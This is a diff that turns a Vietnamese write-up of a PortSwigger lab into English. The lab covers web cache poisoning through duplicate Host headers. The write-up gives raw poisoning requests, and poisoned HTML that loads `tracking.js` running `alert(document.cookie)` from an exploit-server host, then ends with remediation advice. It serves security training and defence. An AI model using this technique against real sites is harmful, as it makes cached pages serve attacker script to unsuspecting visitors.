@@ -1,7 +1,7 @@
 ---
 title: "[PortSwigger] Lab 3: Web Cache Poisoning via Ambiguous Requests"
 date: 2026-09-14
-description: "Khai thác lỗ hổng Web Cache Poisoning qua kỹ thuật Ambiguous Requests do sự bất đồng bộ HTTP Parser giữa tầng Cache Proxy và Backend Server."
+description: "Exploit Web Cache Poisoning using ambiguous HTTP requests stemming from parser discrepancies between caching proxies and backend application servers."
 categories: ["PortSwigger Labs"]
 series: ["HTTP Host Header Attacks"]
 series_order: 3
@@ -9,115 +9,115 @@ showAuthor: false
 showTableOfContents: true
 ---
 
-## Thông tin bài Lab
-* **Tên bài Lab**: Web cache poisoning via ambiguous requests
-* **Chuyên đề**: HTTP Host Header attacks / Web Cache Poisoning
-* **Mức độ**: Practitioner
-* **Mục tiêu**: Đầu độc Web Cache của trang chủ để kích hoạt hàm JavaScript `alert(document.cookie)` trên trình duyệt của nạn nhân.
+## Challenge Overview
+* **Challenge name**: Web cache poisoning via ambiguous requests
+* **Category**: HTTP Host Header attacks / Web Cache Poisoning
+* **Level**: Practitioner
+* **Objective**: Poison the web cache of the application homepage to execute the JavaScript function `alert(document.cookie)` within victim browsers.
 
 ---
 
-## 1. Kiến thức nền tảng
+## 1. Core Fundamentals
 
-Để hiểu và khai thác thành công lỗ hổng này, chúng ta cần nắm vững cơ chế phối hợp giữa Caching Proxy và Backend, cũng như khái niệm Cache Key và chuẩn xử lý HTTP Request Headers.
+To comprehend and exploit this vulnerability effectively, one must understand how intermediate caching proxies coordinate with backend origin servers, how Cache Keys are computed, and how HTTP request parsing standards govern duplicate headers.
 
-### 1.1. Cơ chế hoạt động của Web Cache và Cache Key
+### 1.1. Mechanics of Web Caching and the Cache Key
 
-Trong kiến trúc hệ thống hiện đại, Web Cache (như Varnish, Nginx Cache, Cloudflare, Squid) đứng trước ứng dụng web để lưu tạm các phản hồi tĩnh hoặc trang HTML tĩnh, giúp giảm tải cho cơ sở dữ liệu và tối ưu thời gian phản hồi cho người dùng.
+In modern distributed web architectures, a caching proxy (such as Varnish, Nginx Cache, Cloudflare, or Squid) sits in front of backend web applications to temporarily cache static assets and rendered HTML pages. This offloads database traffic and drastically reduces response latency.
 
-Khi một request được gửi đến, Cache sẽ tính toán chuỗi định danh duy nhất gọi là **Cache Key** để xác định xem nội dung này đã được lưu trữ trong bộ nhớ đệm hay chưa. Theo quy chuẩn mặc định, Cache Key gồm các thành phần cơ bản sau:
+Whenever an HTTP request arrives, the caching proxy computes a unique identifier termed the **Cache Key** to verify whether a fresh copy of the requested resource already exists in memory or disk. By default, standard Cache Keys are derived from:
 
 ```text
-Cache Key = HTTP Method + Request Path / URI + Host Header chính
+Cache Key = HTTP Method + Request Path / URI + Primary Host Header
 ```
 
-- **Cache Hit (`X-Cache: hit`):** Request gửi lên có Cache Key trùng khớp với một bản ghi đang tồn tại trong Cache RAM/Disk. Máy chủ Cache lập tức trả về nội dung đã lưu trữ mà không cần kết nối vào máy chủ Backend.
-- **Cache Miss (`X-Cache: miss`):** Cache Key chưa tồn tại trong bộ nhớ đệm. Proxy sẽ chuyển tiếp request vào Backend để lấy dữ liệu tươi mới, sau đó lưu bản sao vào Cache (theo chỉ thị `Cache-Control: max-age=...`) rồi mới phản hồi cho Client.
+- **Cache Hit (`X-Cache: hit`):** The incoming request possesses a Cache Key matching an active, non-expired cache record. The caching proxy immediately returns the stored response without contacting the backend server.
+- **Cache Miss (`X-Cache: miss`):** The Cache Key does not exist in cache storage. The proxy forwards the request to the upstream backend server to retrieve fresh data, stores a cached copy according to `Cache-Control: max-age=...` directives, and returns the response to the client.
 
-### 1.2. Khái niệm Ambiguous Requests & Parser Discrepancy
+### 1.2. Ambiguous Requests and HTTP Parser Discrepancies
 
-Theo đặc tả kỹ thuật **RFC 7230 (mục 5.4)**, trong một request HTTP/1.1 chuẩn **chỉ được phép tồn tại duy nhất một header `Host`**. Nếu một gói tin chứa từ 2 header `Host` trở lên, máy chủ bắt buộc phải từ chối xử lý và phản hồi bằng mã lỗi `400 Bad Request`.
+According to **RFC 7230 (Section 5.4)**, a compliant HTTP/1.1 request **must contain exactly one `Host` header field**. If an incoming request includes multiple `Host` header fields, the server MUST reject the message with a `400 Bad Request` status code.
 
-Tuy nhiên, trong mô hình phân tán gồm tầng Front-end Proxy và Backend Server, hai thành phần này thường sử dụng các bộ HTTP Parser khác nhau:
+However, in multi-tiered architectures combining front-end proxies and backend application runtimes, each tier frequently employs different HTTP parsing libraries:
 
-- **Tại tầng Front-end Cache:** Hệ thống parser chỉ đọc header `Host` đầu tiên để tạo Cache Key, coi các header trùng lặp tiếp theo là unkeyed hoặc bỏ qua.
-- **Tại tầng Backend Application:** Bộ parser của framework hoặc ứng dụng khi gặp các header trùng tên lại ưu tiên ghi đè và sử dụng giá trị của header `Host` thứ hai để xử lý logic sinh giao diện HTML.
+- **At the Front-end Caching Tier:** The parser reads only the first `Host` header to compute the Cache Key, treating subsequent duplicate headers as unkeyed metadata or ignoring them altogether.
+- **At the Backend Application Tier:** When encountering duplicate headers, the backend framework's parser may override the initial value and process the second `Host` header to handle business logic and dynamic template generation.
 
 > [!NOTE]
-> **Điểm mấu chốt:** Sự chênh lệch Parser Differential giữa Proxy Cache và Backend chính là kẽ hở cho phép kẻ tấn công tạo ra một Ambiguous Request: một mặt đánh lừa Cache Proxy lưu dữ liệu vào Cache Key hợp lệ của người dùng, mặt khác ép Backend sinh ra mã nguồn độc hại.
+> **Key Takeaway:** This parser differential between the cache proxy and the backend origin creates an opening for an Ambiguous Request: the attacker fools the cache proxy into associating the response with a legitimate victim's Cache Key while concurrently forcing the backend to render attacker-controlled markup.
 
 ---
 
-## 2. Mô hình tấn công
+## 2. Attack Architecture / Threat Model
 
-### 2.1. Phân tích nguyên nhân gốc rễ
+### 2.1. Root Cause Analysis
 
-Lỗ hổng phát sinh từ sự kết hợp của hai thiếu sót bảo mật:
-1. **Thiếu chuẩn hóa tại tầng Cache Proxy:** Proxy không thực thi nghiêm ngặt RFC 7230 để loại bỏ request có nhiều `Host` header, đồng thời không đưa header `Host` thứ hai vào Cache Key.
-2. **Tin tưởng ngầm định Input tại tầng Backend:** Ứng dụng Backend tự động lấy giá trị từ header `Host` do người dùng kiểm soát để ghép vào chuỗi nạp file JavaScript tĩnh (`<script src="//[Host-Header-Value]/resources/js/tracking.js">`).
+The vulnerability stems from the confluence of two architectural security deficiencies:
+1. **Lack of RFC 7230 Enforcement at the Proxy Layer:** The front-end cache fails to reject requests bearing duplicate `Host` headers and omits the secondary `Host` header from the computed Cache Key.
+2. **Implicit Input Trust at the Backend Tier:** The backend application dynamically references the client-supplied `Host` header when building absolute or protocol-relative asset script URLs (`<script src="//[Host-Header-Value]/resources/js/tracking.js">`).
 
-### 2.2. Sơ đồ luồng dữ liệu tấn công
+### 2.2. Attack Flow Diagram
 
 ```text
-[ Kẻ tấn công ]
+[ Attacker ]
        │
-       │  Gửi Request Ambiguous:
+       │  Sends Ambiguous Request:
        │  GET / HTTP/1.1
-       │  Host: victim-lab.net         <── (1) Cache đọc Host này: Cache Key = 'GET / victim-lab.net'
-       │  Host: exploit-server.net     <── (2) Backend lại đọc Host này để render mã HTML!
+       │  Host: victim-lab.net         <── (1) Cache reads this Host: Cache Key = 'GET / victim-lab.net'
+       │  Host: exploit-server.net     <── (2) Backend reads this Host to render HTML markup!
        ▼
 [ Front-end Cache Proxy ] ──(Cache Miss)──► [ Back-end Application Server ]
        │                                                 │
-       │                                                 │ Render trang chủ chứa script độc:
+       │                                                 │ Renders homepage referencing malicious script:
        │                                                 │ <script src="//exploit-server.net/resources/js/tracking.js">
        │                                                 ▼
-       │◄──────── Trả về HTML đã bị can thiệp ───────────┘
+       │◄──────── Returns poisoned HTML response ────────┘
        │
-       ├─► [ LƯU VÀO CACHE ] Gán với Cache Key: "GET / victim-lab.net"
+       ├─► [ SAVED TO CACHE ] Stored under Cache Key: "GET / victim-lab.net"
        │
-[ Nạn nhân ]
+[ Victim ]
        │  GET / HTTP/1.1
-       │  Host: victim-lab.net         <── Gửi request truy cập trang chủ bình thường
+       │  Host: victim-lab.net         <── Issues normal request to homepage
        ▼
-[ Front-end Cache Proxy ] ──(Cache HIT!)──► Trả về bản Cache HTML chứa script của Kẻ tấn công!
-                                            Trình duyệt nạn nhân tự động tải tracking.js 
-                                            từ exploit-server và thực thi ==> XSS Kích hoạt!
+[ Front-end Cache Proxy ] ──(Cache HIT!)──► Serves poisoned cached HTML containing Attacker's script!
+                                             Victim browser automatically executes tracking.js
+                                             from exploit-server ==> Stored XSS Triggered!
 ```
 
 > [!NOTE]
-> **Question:** Tại sao không dùng 1 header `Host: exploit-server.net` duy nhất mà phải dùng 2 header?
+> **Question:** Why can't we simply send a single header `Host: exploit-server.net` instead of two headers?
 > 
 > **Answer:**  
-> Nếu ta chỉ gửi một header `Host: exploit-server.net`, Front-end Cache sẽ dùng chính domain của exploit server để làm Cache Key. Khi đó, bản cache độc hại chỉ được lưu dưới key `exploit-server.net`. Người dùng bình thường truy cập bằng domain thật `victim-lab.net` sẽ không bao giờ chạm vào bản cache đó. Ta bắt buộc phải gửi 2 header `Host`:
-> - **Header 1 (`victim-lab.net`)**: Dùng để lừa Front-end Cache lưu vào đúng Cache Key của người dùng thật.
-> - **Header 2 (`exploit-server.net`)**: Dùng để lừa Backend render mã độc vào nội dung trang.
+> If an attacker submits only `Host: exploit-server.net`, the front-end cache will calculate the Cache Key incorporating `exploit-server.net`. The poisoned response would then only be stored under the key associated with the attacker's domain. Regular users browsing the canonical `victim-lab.net` domain would never access that cache entry. Providing two conflicting `Host` headers is mandatory:
+> - **Header 1 (`victim-lab.net`)**: Forces the front-end cache to map the response to the legitimate users' Cache Key.
+> - **Header 2 (`exploit-server.net`)**: Forces the backend origin to render the attacker's script URL into the cached response body.
 
 ---
 
-## 3. Khai thác lỗ hổng
+## 3. Vulnerability Exploitation
 
-Quá trình thực nghiệm tấn công được chia thành 5 bước tuần tự từ khảo sát ban đầu đến thực thi mã độc thành công:
+The exploitation procedure is conducted across five systematic steps, progressing from reconnaissance to weaponization and execution:
 
-### Bước 1: Khảo sát hành vi Cache và điểm phản xạ của Header
+### Step 1: Auditing Caching Behavior and Reflection Points
 
-Gửi request `GET / HTTP/1.1` sang tab **Repeater** trên Burp Suite. Phân tích các header phản hồi và cấu trúc HTML trả về:
+Forward a baseline `GET / HTTP/1.1` request to Burp Suite **Repeater**. Analyze the HTTP response headers and returned HTML structure:
 
-- **Dấu hiệu Web Cache:** Server trả về các header đặc trưng như `Cache-Control: max-age=30`, `Age: 8` và `X-Cache: hit`. Điều này xác nhận hệ thống có sử dụng cơ chế lưu bộ nhớ đệm với chu kỳ làm mới mỗi 30 giây.
-- **Điểm phản xạ tài nguyên:** Trong phần body HTML của trang chủ, server nạp một file script theo cú pháp Protocol-relative URL:
+- **Cache Indicators:** The server returns distinct caching response headers including `Cache-Control: max-age=30`, `Age: 8`, and `X-Cache: hit`. This confirms that a public cache operates in front of the application with a 30-second TTL.
+- **Resource Reflection Point:** Within the homepage HTML body, a script tag imports a tracking script via a protocol-relative URL:
 
 ```html
 <script type="text/javascript" src="//0a1700f304b0069f805462b60076008c.h1-web-security-academy.net/resources/js/tracking.js"></script>
 ```
 
-Nhận xét: Tên miền trong đường dẫn nạp file JS chính là giá trị lấy trực tiếp từ header `Host` của request.
+Observation: The domain in the imported JavaScript path is dynamically constructed directly from the request's incoming `Host` header.
 
-![Hình 1: Request và Response ban đầu xác nhận sự tồn tại của Web Cache và đường dẫn tracking.js](extracted_images/image1.png)
+![Figure 1: Initial Request and Response confirming Web Cache headers and tracking.js path](extracted_images/image1.png)
 
 ---
 
-### Bước 2: Thử nghiệm kỹ thuật Ambiguous Request với Cache Buster (`?abc=1`)
+### Step 2: Testing Ambiguous Requests with a Cache Buster (`?abc=1`)
 
-Để kiểm chứng khả năng can thiệp vào mã nguồn mà không làm hỏng bản cache của trang chủ thật, ta sử dụng một Cache Buster là tham số `?abc=1` nhằm tạo ra một không gian Cache Key độc lập. Đồng thời, ta chèn thêm một header `Host` thứ hai với giá trị tùy biến `Host: tu4nki3t`:
+To test reflection behavior safely without contaminating the production cache for legitimate visitors, attach a Cache Buster parameter (`?abc=1`) to isolate a unique Cache Key space. Simultaneously, append a secondary `Host` header with an arbitrary payload `Host: tu4nki3t`:
 
 ```http
 GET /?abc=1 HTTP/1.1
@@ -126,23 +126,23 @@ Host: tu4nki3t
 User-Agent: Mozilla/5.0...
 ```
 
-**Kết quả kiểm chứng:**
-- **Trạng thái Cache:** Response trả về `X-Cache: miss` ở lần gửi đầu tiên và `Age: 0`.
-- **Phản xạ thành công:** Đường dẫn file JavaScript trong thẻ script bị biến đổi thành:
+**Verification Results:**
+- **Cache State:** The initial request registers an `X-Cache: miss` with `Age: 0`.
+- **Successful Reflection:** The script tag in the response body dynamically reflects the second header value:
 
 ```html
 <script type="text/javascript" src="//tu4nki3t/resources/js/tracking.js"></script>
 ```
 
-Điều này chứng minh: Backend đã ưu tiên đọc header `Host` thứ hai (`tu4nki3t`) để sinh đường dẫn tài nguyên. Đồng thời, liên kết đến Exploit Server đã được xác định là: `https://exploit-0aa4009f047306ab804d6188010b0021.exploit-server.net`.
+This confirms our hypothesis: the backend server prioritizes the second `Host` header (`tu4nki3t`) when resolving resource paths. Additionally, the assigned Exploit Server domain is identified as `https://exploit-0aa4009f047306ab804d6188010b0021.exploit-server.net`.
 
-![Hình 2: Thử nghiệm Cache Buster ?abc=1 và header Host thứ hai (tu4nki3t) phản xạ thành công vào mã nguồn](extracted_images/image2.png)
+![Figure 2: Verifying secondary Host header reflection with Cache Buster ?abc=1](extracted_images/image2.png)
 
 ---
 
-### Bước 3: Chuẩn bị mã độc trên Exploit Server
+### Step 3: Hosting the Malicious Script on the Exploit Server
 
-Vì backend của ứng dụng vẫn giữ nguyên cấu trúc đường dẫn file là `/resources/js/tracking.js`, ta truy cập vào giao diện Exploit Server và thiết lập một endpoint tương ứng chứa payload JavaScript:
+Because the backend retains the relative file path `/resources/js/tracking.js`, navigate to the Exploit Server web interface and configure a corresponding payload endpoint:
 
 - **File Path:** `/resources/js/tracking.js`
 - **HTTP Response Header:**
@@ -155,17 +155,17 @@ Vì backend của ứng dụng vẫn giữ nguyên cấu trúc đường dẫn f
   alert(document.cookie);
   ```
 
-Nhấn nút **Store** để lưu trữ file mã độc trên máy chủ khai thác.
+Click **Store** to stage the payload on the exploit infrastructure.
 
-![Hình 3: Cấu hình file payload /resources/js/tracking.js chứa alert(document.cookie) trên Exploit Server](extracted_images/image3.png)
+![Figure 3: Configuring payload /resources/js/tracking.js containing alert(document.cookie) on the Exploit Server](extracted_images/image3.png)
 
 ---
 
-### Bước 4: Đầu độc trực tiếp vào Cache của trang chủ
+### Step 4: Poisoning the Main Homepage Cache
 
-Quay lại Burp Suite Repeater để chuyển từ bước thử nghiệm sang giai đoạn khai thác chính thức:
-1. **Gỡ bỏ Cache Buster:** Xóa tham số `?abc=1` trên dòng Request Line để tác động trực tiếp vào trang chủ `GET / HTTP/1.1`.
-2. **Gán domain Exploit Server:** Thay thế giá trị của header `Host` thứ hai bằng domain máy chủ tấn công:
+Return to Burp Suite Repeater to transition from testing to active exploitation:
+1. **Remove the Cache Buster:** Strip the `?abc=1` query parameter from the Request Line to target the live homepage endpoint `GET / HTTP/1.1`.
+2. **Assign the Exploit Domain:** Replace the value of the secondary `Host` header with the Exploit Server hostname:
 
 ```http
 GET / HTTP/1.1
@@ -174,46 +174,46 @@ Host: exploit-0aa4009f047306ab804d6188010b0021.exploit-server.net
 Cookie: session=...
 ```
 
-Thực hiện gửi request cho đến khi response trả về xác nhận đường dẫn mã độc đã xuất hiện và được lưu trữ vào bộ nhớ đệm:
+Send the request repeatedly until the response reflects the exploit server domain and is stored in the cache:
 
 ```html
 <script type="text/javascript" src="//exploit-0aa4009f047306ab804d6188010b0021.exploit-server.net/resources/js/tracking.js"></script>
 ```
 
-Khi gửi tiếp một lần nữa, header phản hồi ghi nhận `X-Cache: hit`, chứng tỏ bản cache độc hại đã chính thức chiếm quyền hiển thị của trang chủ.
+Re-issuing the request produces an `X-Cache: hit` response header, verifying that the poisoned response has officially hijacked the homepage cache entry.
 
-![Hình 4: Request đầu độc trang chủ chính thức bằng domain Exploit Server thành công](extracted_images/image4.png)
-
----
-
-### Bước 5: Kích hoạt tấn công và kiểm tra kết quả
-
-Nạn nhân khi duyệt vào trang chủ sẽ nhận được bản lưu trữ nhiễm độc từ Cache Proxy. Trình duyệt của nạn nhân tự động tải và thực thi file `/resources/js/tracking.js` từ Exploit Server, kích hoạt hộp thoại `alert(document.cookie)`.
-
-Giao diện bài Lab lập tức xuất hiện thông báo: **Congratulations, you solved the lab!**
-
-![Hình 5: Bài lab được giải quyết thành công](extracted_images/image5.png)
+![Figure 4: Poisoning the live homepage cache using the secondary Exploit Server Host header](extracted_images/image4.png)
 
 ---
 
-## 4. Biện pháp khắc phục
+### Step 5: Triggering the Attack and Verifying Execution
 
-Để phòng ngừa triệt để các lỗ hổng Web Cache Poisoning qua kỹ thuật Ambiguous Request, đội ngũ vận hành và phát triển cần áp dụng mô hình phòng thủ Defense-in-Depth tại cả 2 tầng:
+When simulated victims navigate to the homepage, the front-end cache serves the compromised cached response. The victim browser loads and executes `/resources/js/tracking.js` from the Exploit Server, triggering `alert(document.cookie)`.
 
-### 4.1. Cấu hình bảo vệ tại tầng Reverse Proxy
+The lab interface instantly updates to display: **Congratulations, you solved the lab!**
 
-- **Tuân thủ nghiêm ngặt đặc tả RFC 7230:** Cấu hình Reverse Proxy (Nginx, Apache, HAProxy, Envoy) từ chối lập tức bằng mã lỗi `400 Bad Request` đối với bất kỳ request nào chứa nhiều hơn một header `Host` hoặc header `Host` không hợp lệ.
-- **Chuẩn hóa Request:** Trước khi chuyển tiếp request vào mạng nội bộ, proxy phải chuẩn hóa lại toàn bộ HTTP headers và loại bỏ triệt để các header trùng lặp hoặc không xác thực.
-- **Loại bỏ Unkeyed Headers độc hại:** Cấu hình Edge Proxy tự động loại bỏ các header ghi đè như `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server` do client từ Internet gửi lên.
+![Figure 5: Challenge successfully completed](extracted_images/image5.png)
 
-### 4.2. Cấu hình bảo vệ tại tầng Backend
+---
 
-- **Sử dụng đường dẫn tương đối:** Tuyệt đối không sử dụng header `Host` động để sinh đường dẫn nạp tài nguyên tĩnh (JS, CSS, hình ảnh). Thay vào đó, hãy luôn sử dụng đường dẫn tương đối an toàn:
+## 4. Remediation Strategies
+
+To systematically prevent Web Cache Poisoning via ambiguous HTTP requests, organizations must adopt defense-in-depth controls across both reverse proxy and backend application layers:
+
+### 4.1. Reverse Proxy Hardening Configurations
+
+- **Strict RFC 7230 Compliance:** Configure front-end proxies (Nginx, Apache, HAProxy, Envoy) to immediately reject requests containing duplicate `Host` headers with an `HTTP 400 Bad Request` status code.
+- **Request Normalization:** Normalize incoming HTTP headers before forwarding traffic upstream, stripping duplicate or ambiguous headers entirely.
+- **Strip Dangerous Unkeyed Headers:** Ensure perimeter proxies strip or ignore untrusted override headers such as `X-Forwarded-Host`, `X-Host`, and `X-Forwarded-Server` received from external clients.
+
+### 4.2. Backend Application Hardening
+
+- **Adopt Relative Resource URLs:** Do not generate resource import paths using dynamic `Host` headers. Instead, utilize root-relative paths:
 
 ```html
-<!-- Cấu hình chuẩn: Nạp tài nguyên bằng đường dẫn tương đối -->
+<!-- Secure approach: Root-relative resource referencing -->
 <script src="/resources/js/tracking.js"></script>
 ```
 
-- **Sử dụng Domain tĩnh:** Trong trường hợp bắt buộc phải sử dụng đường dẫn tuyệt đối, domain phải được lấy cố định từ biến môi trường cấu hình của hệ thống (ví dụ `APP_URL=https://example.com` trong file `.env`), không bao giờ đọc trực tiếp từ biến động như `$_SERVER['HTTP_HOST']` hay `req.headers.host`.
-- **Thiết lập chính sách Cache phù hợp:** Đối với các trang web hoặc tài nguyên có phản xạ thông tin từ người dùng, cần khai báo rõ ràng chỉ thị `Cache-Control: private, no-cache` để ngăn cản Proxy lưu trữ vào bộ nhớ đệm công cộng.
+- **Enforce Immutable Domain Configuration:** If absolute URLs are strictly required, populate domains strictly from immutable environment variables (e.g., `APP_URL=https://example.com` in `.env`), never reading dynamic variables such as `$_SERVER['HTTP_HOST']` or `req.headers.host`.
+- **Implement Appropriate Cache Controls:** For responses that reflect user-controllable input, apply strict `Cache-Control: private, no-cache` directives to prohibit public proxy caching.
